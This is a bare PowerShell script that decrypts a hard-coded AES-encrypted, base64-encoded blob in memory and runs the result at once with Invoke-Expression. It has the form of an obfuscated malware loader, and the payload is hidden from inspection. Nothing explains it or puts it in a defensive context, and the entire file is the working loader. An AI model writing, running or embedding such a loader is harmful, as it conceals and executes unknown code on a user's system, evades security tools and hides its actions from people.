$key = [System.Text.Encoding]::UTF8.GetBytes("PhantomKey1234567890123456789012")
$iv = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")
$enc = "rZWLNLcpuMnGExephNEDAeqtl3Ef/Xx3oYUihu5cMvV/vDt/3A1b6rauTffGeL7u2hrqZcoz3JWxme01iWe1Uptg/1CmTWiX8MBz+vLgLjlBlx67yW1Zx5PW85ezsXQ8kl9DAXCDX0AC0ceUUhUkwHzldyxsVwnUj1Z3b5cxhr9FaCzrannQa8ogsMzZNbPe+PEMgnmbltmtyNBugtkYR86T00oN8+I+ZGO5vk+JSVTwBjdF4rfzZbStgPEI/h8igSc4peF2mmL9MC598Us2rg1/8avoRJqtGU3ybUfi2+412Pl8vjGhAeDIdspsHrFozVAW3vAwLYDRMkeCCBXwe/ZM02yYIfIV1DxZXQMU8bJcSi/A9Mxn4BGQftr0SijOnhfZRtaioLSXNuUFY5hjSyTVXChCrNTX+eZWgj/tSjx0I1oqdKueUh2RcaUxGfCkbi2zJoShlaHCac7sqo2lPEvdmv8b6/K9Ks62/mF3emJoyQvB0agzzC4VfmnEjxhUb6adt5xYJoum2BSvMGEa/xTVgbmdpsdx7Zmm4QypRK4tev2ewy5isDdQX123ST2CRNBNoCtqloYd7sQoDag1TSFsSvKDHJV8xVBq9DMujNwLOoEEtPln0JkgV71do8Gf7Wva7jV/9Gsd3VL7+Ck9qXg9AKGGjnzLLfOXMul1Y/5Nxolaj/IkswBvue/bR5pUJO0DQIZBl3hQcuh5rjIQEdeyDGIOoE+XV1uqW8iB5ixtIZLbCCn8dZ2A+Hn+3xp3w3PEMGpprv2JEr/NqQu5VxwDEM2aNmbKsX+QmKgpOhkgBz9wZ6XPiydkojVAzY8gkGuT11trE3Tkg9mU9fFfPqb+JPF6YykptM2aIKbDHd2i3/u45wHlu0UtxsZ4C64vBM6lArxQhTZH6l9+RXH9EVSmvN3aTtvIeVHFQJW6qkNi5QbkDIpfIOTvHJCPMxYtDvtzhQVCDE5+fGp8DV9ShJhqtpHEggq3/955/otwhIU="
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key; $aes.IV = $iv
$ms = New-Object System.IO.MemoryStream(,[Convert]::FromBase64String($enc))
$cs = New-Object System.Security.Cryptography.CryptoStream($ms, $aes.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Read)
$sr = New-Object System.IO.StreamReader($cs)
$decryptedScript = $sr.ReadToEnd()
$sr.Close();$cs.Close();$ms.Close()
IEX $decryptedScript
